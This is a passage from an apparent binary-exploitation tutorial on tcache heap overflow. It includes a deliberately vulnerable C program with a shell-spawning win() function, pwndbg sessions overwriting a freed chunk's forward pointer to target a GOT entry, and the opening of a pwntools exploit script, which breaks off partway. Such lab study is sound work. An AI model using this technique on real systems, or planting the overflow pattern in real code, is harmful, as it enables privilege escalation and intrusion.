</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;5. exit</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>};
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">for</span>(<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">6</span>; i<span style="color:#f92672">++</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">fprintf</span>(stderr, <span style="color:#e6db74">&#34;%s&#34;</span>, MENU[i]);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">allocate</span>(<span style="color:#66d9ef">int</span> n){
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">fprintf</span>(stderr, <span style="color:#e6db74">&#34;Allocating %d bytes</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, n);
</span></span><span style="display:flex;"><span>  ptrs[cnt] <span style="color:#f92672">=</span> <span style="color:#a6e22e">malloc</span>(n);
</span></span><span style="display:flex;"><span>  used[cnt] <span style="color:#f92672">=</span> UNDERUSE;
</span></span><span style="display:flex;"><span>  request_size[cnt] <span style="color:#f92672">=</span> n;
</span></span><span style="display:flex;"><span>  cnt<span style="color:#f92672">++</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">free_chunk</span>(<span style="color:#66d9ef">int</span> n){
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (used[n] <span style="color:#f92672">==</span> FREED)
</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">fprintf</span>(stderr, <span style="color:#e6db74">&#34;Freeing pointer %d: %p</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, n, ptrs[n]);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">free</span>(ptrs[n]);
</span></span><span style="display:flex;"><span>  used[n] <span style="color:#f92672">=</span> FREED;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">edit</span>(<span style="color:#66d9ef">int</span> n, <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>s, <span style="color:#66d9ef">int</span> len){
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (used[n] <span style="color:#f92672">==</span> FREED)
</span></span><span style="display:flex;"><span>	 <span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> l1 <span style="color:#f92672">=</span> <span style="color:#a6e22e">strlen</span>(ptrs[n]);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> l2 <span style="color:#f92672">=</span> len;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> l;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (l1 <span style="color:#f92672">&lt;</span> l2) l <span style="color:#f92672">=</span> l2;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">else</span> l <span style="color:#f92672">=</span> l1;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">memcpy</span>(ptrs[n], s, l);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">list</span>(){
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">fprintf</span>(stderr, <span style="color:#e6db74">&#34;Index</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">Pointers</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">Requested Size</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">Status</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> cnt; i<span style="color:#f92672">++</span>){
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">fprintf</span>(stderr, <span style="color:#e6db74">&#34;%d</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">%p</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">%u</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">&#34;</span>, i, ptrs[i], request_size[i]);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (used[i] <span style="color:#f92672">==</span> UNDERUSE)
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">fprintf</span>(stderr, <span style="color:#e6db74">&#34;Under Use</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (used[i] <span style="color:#f92672">==</span> FREED)
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">fprintf</span>(stderr, <span style="color:#e6db74">&#34;Freed</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">win</span>() {
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\033</span><span style="color:#e6db74">[1;31m[+] PWNED!!!</span><span style="color:#ae81ff">\033</span><span style="color:#e6db74">[0m&#34;</span>);
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">execl</span>(<span style="color:#e6db74">&#34;/bin/sh&#34;</span>, <span style="color:#e6db74">&#34;sh&#34;</span>, <span style="color:#e6db74">&#34;-c&#34;</span>, <span style="color:#e6db74">&#34;/bin/sh&#34;</span>, (<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(){
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> buf[<span style="color:#ae81ff">100</span>];
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> str[<span style="color:#ae81ff">100</span>];
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> n;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">setbuf</span>(stderr, NULL);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">while</span> (<span style="color:#ae81ff">1</span>){
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">print_menu</span>();
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">ssize_t</span> l <span style="color:#f92672">=</span> <span style="color:#a6e22e">read</span>(<span style="color:#ae81ff">0</span>, buf, <span style="color:#ae81ff">90</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (buf[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;1&#39;</span>){
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">sscanf</span>(buf <span style="color:#f92672">+</span> <span style="color:#66d9ef">sizeof</span>(MALLOC), <span style="color:#e6db74">&#34;%d&#34;</span>, <span style="color:#f92672">&amp;</span>n);
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">allocate</span>(n);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (buf[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;2&#39;</span>){
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">sscanf</span>(buf <span style="color:#f92672">+</span> <span style="color:#66d9ef">sizeof</span>(FREE), <span style="color:#e6db74">&#34;%d&#34;</span>, <span style="color:#f92672">&amp;</span>n);
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">free_chunk</span>(n);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (buf[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;3&#39;</span>){
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>first_space <span style="color:#f92672">=</span> <span style="color:#a6e22e">strstr</span>(buf, <span style="color:#e6db74">&#34; &#34;</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>second_space <span style="color:#f92672">=</span> <span style="color:#a6e22e">strstr</span>(first_space <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>, <span style="color:#e6db74">&#34; &#34;</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">int</span> str_len <span style="color:#f92672">=</span> l <span style="color:#f92672">-</span> (second_space <span style="color:#f92672">-</span> buf) <span style="color:#f92672">-</span> <span style="color:#ae81ff">2</span>;
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">sscanf</span>(buf <span style="color:#f92672">+</span> <span style="color:#66d9ef">sizeof</span>(EDIT), <span style="color:#e6db74">&#34;%d %[^</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">]&#34;</span>, <span style="color:#f92672">&amp;</span>n, str);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (used[n] <span style="color:#f92672">==</span> UNDERUSE)
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">edit</span>(n, second_space<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>, str_len);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">else</span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">fprintf</span>(stderr, <span style="color:#e6db74">&#34;pointer cannot be edited</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (buf[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;4&#39;</span>)
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">list</span>();
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (buf[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;5&#39;</span>)
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">continue</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>&gt; gcc ho.c -o ho -no-pie
</span></span><span style="display:flex;"><span>&gt; patchelf --set-interpreter ./ld-2.27.so --set-rpath . ./ho
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>‚ùØ ls -la           
</span></span><span style="display:flex;"><span>total <span style="color:#ae81ff">17808</span>
</span></span><span style="display:flex;"><span>drwxrwxr-x  <span style="color:#ae81ff">2</span> at0m at0m     <span style="color:#ae81ff">4096</span> Jun <span style="color:#ae81ff">26</span> 17:03 .
</span></span><span style="display:flex;"><span>drwxrwxr-x <span style="color:#ae81ff">21</span> at0m at0m     <span style="color:#ae81ff">4096</span> Jun <span style="color:#ae81ff">26</span> 17:03 ..
</span></span><span style="display:flex;"><span>-rwsr-sr-x  <span style="color:#ae81ff">1</span> root root    <span style="color:#ae81ff">21736</span> Jun <span style="color:#ae81ff">26</span> 17:03 ho
</span></span><span style="display:flex;"><span>-rw-rw-r--  <span style="color:#ae81ff">1</span> at0m at0m     <span style="color:#ae81ff">2356</span> Jun <span style="color:#ae81ff">26</span> 17:03 ho.c
</span></span><span style="display:flex;"><span>-rwxrwxr-x  <span style="color:#ae81ff">1</span> at0m at0m  <span style="color:#ae81ff">1386480</span> Jun <span style="color:#ae81ff">26</span> 17:03 ld-2.27.so
</span></span><span style="display:flex;"><span>-rwxrwxr-x  <span style="color:#ae81ff">1</span> at0m at0m <span style="color:#ae81ff">16803192</span> Jun <span style="color:#ae81ff">26</span> 17:03 libc.so.6
</span></span><span style="display:flex;"><span>-rw-rw-r--  <span style="color:#ae81ff">1</span> at0m at0m      <span style="color:#ae81ff">117</span> Jun <span style="color:#ae81ff">26</span> 17:03 README.md
</span></span></code></pre></div><p>This is same as previous binary which has patch of previous two vuln i.e pointer can&rsquo; t be edited and doubled freed chunk will also point one time, So we need to use new technique.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>pwndbg&gt; info functions
</span></span><span style="display:flex;"><span>All defined functions:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Non-debugging symbols:
</span></span><span style="display:flex;"><span>0x0000000000401000  _init
</span></span><span style="display:flex;"><span>0x0000000000401110  free@plt
</span></span><span style="display:flex;"><span>0x0000000000401120  puts@plt
</span></span><span style="display:flex;"><span>0x0000000000401130  strlen@plt
</span></span><span style="display:flex;"><span>0x0000000000401140  __stack_chk_fail@plt
</span></span><span style="display:flex;"><span>0x0000000000401150  setbuf@plt
</span></span><span style="display:flex;"><span>0x0000000000401160  strchr@plt
</span></span><span style="display:flex;"><span>0x0000000000401170  fputs@plt
</span></span><span style="display:flex;"><span>0x0000000000401180  read@plt
</span></span><span style="display:flex;"><span>0x0000000000401190  fprintf@plt
</span></span><span style="display:flex;"><span>0x00000000004011a0  memcpy@plt
</span></span><span style="display:flex;"><span>0x00000000004011b0  malloc@plt
</span></span><span style="display:flex;"><span>0x00000000004011c0  __isoc99_sscanf@plt
</span></span><span style="display:flex;"><span>0x00000000004011d0  fwrite@plt
</span></span><span style="display:flex;"><span>0x00000000004011e0  execl@plt
</span></span><span style="display:flex;"><span>0x00000000004011f0  _start
</span></span><span style="display:flex;"><span>0x0000000000401220  _dl_relocate_static_pie
</span></span><span style="display:flex;"><span>0x0000000000401230  deregister_tm_clones
</span></span><span style="display:flex;"><span>0x0000000000401260  register_tm_clones
</span></span><span style="display:flex;"><span>0x00000000004012a0  __do_global_dtors_aux
</span></span><span style="display:flex;"><span>0x00000000004012d0  frame_dummy
</span></span><span style="display:flex;"><span>0x00000000004012d6  print_menu
</span></span><span style="display:flex;"><span>0x0000000000401379  allocate
</span></span><span style="display:flex;"><span>0x0000000000401425  free_chunk
</span></span><span style="display:flex;"><span>0x00000000004014c5  edit
</span></span><span style="display:flex;"><span>0x0000000000401567  list
</span></span><span style="display:flex;"><span>0x000000000040167f  win
</span></span><span style="display:flex;"><span>0x00000000004016c2  main
</span></span><span style="display:flex;"><span>0x00000000004018f0  __libc_csu_init
</span></span><span style="display:flex;"><span>0x0000000000401960  __libc_csu_fini
</span></span><span style="display:flex;"><span>0x0000000000401968  _fini
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>pwndbg&gt; r
</span></span><span style="display:flex;"><span>Starting program: /home/at0m/Downloads/hack/Youtube/Binary Exploitation/J. Heap Overflow Tcache/ho 
</span></span><span style="display:flex;"><span>Choose from the following menu:
</span></span><span style="display:flex;"><span>1. malloc chunk eg <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">20</span>
</span></span><span style="display:flex;"><span>2. free chunk eg <span style="color:#ae81ff">2</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>3. edit chunk content eg <span style="color:#ae81ff">3</span> <span style="color:#ae81ff">0</span> AAAA
</span></span><span style="display:flex;"><span>4. list chunks
</span></span><span style="display:flex;"><span>5. exit
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span> <span style="color:#ae81ff">8</span>
</span></span><span style="display:flex;"><span>Allocating <span style="color:#ae81ff">8</span> bytes
</span></span><span style="display:flex;"><span>Choose from the following menu:
</span></span><span style="display:flex;"><span>6. malloc chunk eg <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">20</span>
</span></span><span style="display:flex;"><span>7. free chunk eg <span style="color:#ae81ff">2</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>8. edit chunk content eg <span style="color:#ae81ff">3</span> <span style="color:#ae81ff">0</span> AAAA
</span></span><span style="display:flex;"><span>9. list chunks
</span></span><span style="display:flex;"><span>10. exit
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">2</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>Freeing pointer 0: 0x2499e260
</span></span><span style="display:flex;"><span>Choose from the following menu:
</span></span><span style="display:flex;"><span>11. malloc chunk eg <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">20</span>
</span></span><span style="display:flex;"><span>12. free chunk eg <span style="color:#ae81ff">2</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>13. edit chunk content eg <span style="color:#ae81ff">3</span> <span style="color:#ae81ff">0</span> AAAA
</span></span><span style="display:flex;"><span>14. list chunks
</span></span><span style="display:flex;"><span>15. exit
</span></span><span style="display:flex;"><span>^C
</span></span></code></pre></div><p><img src="/img/heap_overflow.png" alt="heap_overflow.png"></p>
<p>Look at purple chunk, Here first chunk is not writable but other 3 are which are of 8 bytes each. So we can write upto 24 bytes.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>pwndbg&gt; r
</span></span><span style="display:flex;"><span>Starting program: /home/at0m/Downloads/hack/Youtube/Binary Exploitation/J. Heap Overflow Tcache/ho 
</span></span><span style="display:flex;"><span>Choose from the following menu:
</span></span><span style="display:flex;"><span>1. malloc chunk eg <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">20</span>
</span></span><span style="display:flex;"><span>2. free chunk eg <span style="color:#ae81ff">2</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>3. edit chunk content eg <span style="color:#ae81ff">3</span> <span style="color:#ae81ff">0</span> AAAA
</span></span><span style="display:flex;"><span>4. list chunks
</span></span><span style="display:flex;"><span>5. exit
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span> <span style="color:#ae81ff">8</span>
</span></span><span style="display:flex;"><span>Allocating <span style="color:#ae81ff">8</span> bytes
</span></span><span style="display:flex;"><span>Choose from the following menu:
</span></span><span style="display:flex;"><span>6. malloc chunk eg <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">20</span>
</span></span><span style="display:flex;"><span>7. free chunk eg <span style="color:#ae81ff">2</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>8. edit chunk content eg <span style="color:#ae81ff">3</span> <span style="color:#ae81ff">0</span> AAAA
</span></span><span style="display:flex;"><span>9. list chunks
</span></span><span style="display:flex;"><span>10. exit
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span> <span style="color:#ae81ff">8</span>
</span></span><span style="display:flex;"><span>Allocating <span style="color:#ae81ff">8</span> bytes
</span></span><span style="display:flex;"><span>Choose from the following menu:
</span></span><span style="display:flex;"><span>11. malloc chunk eg <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">20</span>
</span></span><span style="display:flex;"><span>12. free chunk eg <span style="color:#ae81ff">2</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>13. edit chunk content eg <span style="color:#ae81ff">3</span> <span style="color:#ae81ff">0</span> AAAA
</span></span><span style="display:flex;"><span>14. list chunks
</span></span><span style="display:flex;"><span>15. exit
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">2</span> <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>Freeing pointer 1: 0xda8c280
</span></span><span style="display:flex;"><span>Choose from the following menu:
</span></span><span style="display:flex;"><span>16. malloc chunk eg <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">20</span>
</span></span><span style="display:flex;"><span>17. free chunk eg <span style="color:#ae81ff">2</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>18. edit chunk content eg <span style="color:#ae81ff">3</span> <span style="color:#ae81ff">0</span> AAAA
</span></span><span style="display:flex;"><span>19. list chunks
</span></span><span style="display:flex;"><span>20. exit
</span></span><span style="display:flex;"><span>^C
</span></span><span style="display:flex;"><span>Program received signal SIGINT, Interrupt.
</span></span></code></pre></div><p>We allocated 8 bytes chunk 2 times and we freed the second chunk and now if we look using <code>vis</code>.</p>
<p><img src="/img/heap_overflow2.png" alt="heap_overflow2.png"></p>
<p>The green section is the one which we have freed and purple one is malloc one. So now we want to write data or buffer so much that it overwrites the green section also.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>pwndbg&gt; cyclic <span style="color:#ae81ff">25</span>
</span></span><span style="display:flex;"><span>aaaaaaaabaaaaaaacaaaaaaad
</span></span></code></pre></div><p>Ok so we know that we can put 24 bytes value in purple section but if we put 25 it will start to overwrite green section i.e freed chunk.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>pwndbg&gt; c
</span></span><span style="display:flex;"><span>Continuing.
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">3</span> <span style="color:#ae81ff">0</span> aaaaaaaabaaaaaaacaaaaaaad
</span></span><span style="display:flex;"><span>Choose from the following menu:
</span></span><span style="display:flex;"><span>1. malloc chunk eg <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">20</span>
</span></span><span style="display:flex;"><span>2. free chunk eg <span style="color:#ae81ff">2</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>3. edit chunk content eg <span style="color:#ae81ff">3</span> <span style="color:#ae81ff">0</span> AAAA
</span></span><span style="display:flex;"><span>4. list chunks
</span></span><span style="display:flex;"><span>5. exit
</span></span><span style="display:flex;"><span>^C
</span></span><span style="display:flex;"><span>Program received signal SIGINT, Interrupt.
</span></span></code></pre></div><p><img src="/img/heap_overflow3.png" alt="heap_overflow3.png"></p>
<p>We can see we have successfully overflowed the heap. That highlighted address is of Forward Pointer so we need to put our GOT entry address there.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python3</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># -*- coding: utf-8 -*-</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>exe <span style="color:#f92672">=</span> context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> ELF(args<span style="color:#f92672">.</span>EXE <span style="color:#f92672">or</span> <span style="color:#e6db74">&#39;./ho&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>LOCAL_LIBC:
</span></span><span style="display:flex;"><span>    libc <span style="color:#f92672">=</span> exe<span style="color:#f92672">.</span>libc
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>    library_path <span style="color:#f92672">=</span> libcdb<span style="color:#f92672">.</span>download_libraries(<span style="color:#e6db74">&#39;libc.so.6&#39;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> library_path:
</span></span><span style="display:flex;"><span>        exe <span style="color:#f92672">=</span> context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> ELF<span style="color:#f92672">.</span>patch_custom_libraries(exe<span style="color:#f92672">.</span>path, library_path)
</span></span><span style="display:flex;"><span>        libc <span style="color:#f92672">=</span> exe<span style="color:#f92672">.</span>libc
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>        libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;libc.so.6&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">start</span>(argv<span style="color:#f92672">=</span>[], <span style="color:#f92672">*</span>a, <span style="color:#f92672">**</span>kw):
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;&#39;&#39;Start the exploit against the target.&#39;&#39;&#39;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>GDB:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> gdb<span style="color:#f92672">.</span>debug([exe<span style="color:#f92672">.</span>path] <span style="color:#f92672">+</span> argv, gdbscript<span style="color:#f92672">=</span>gdbscript, <span style="color:#f92672">*</span>a, <span style="color:#f92672">**</span>kw)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> process([exe<span style="color:#f92672">.</span>path] <span style="color:#f92672">+</span> argv, <span style="color:#f92672">*</span>a, <span style="color:#f92672">**</span>kw)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>gdbscript <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;&#39;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">tbreak main
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">continue
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;</span><span style="color:#f92672">.</span>format(<span style="color:#f92672">**</span>locals())
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">malloc</span>(size):
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;exit</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;1 </span><span style="color:#e6db74">{</span>size<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">free</span>(index):
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;exit</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;2 </span><span style="color:#e6db74">{</span>index<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>encode()) 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">edit</span>(index,data):
</span></span><span style="display:flex;"><span>    temp <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;3 </span><span style="color:#e6db74">{</span>index<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>encode()
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;exit</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,temp<span style="color:#f92672">+</span>data)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># -- Exploit goes here --</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io <span style="color:#f92672">=</span> start()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Step 1: Allocate two chunks</span>
</span></span><span style="display:flex;"><span>malloc(<span style="color:#ae81ff">8</span>)  <span style="color:#75715e"># chunk 0</span>
</span></span><span style="display:flex;"><span>malloc(<span style="color:#ae81ff">8</span>)  <span style="color:#75715e"># chunk 1</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Step 2: Free the second chunk to place it in the tcache</span>
</span></span><span style="display:flex;"><span>free(<span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>
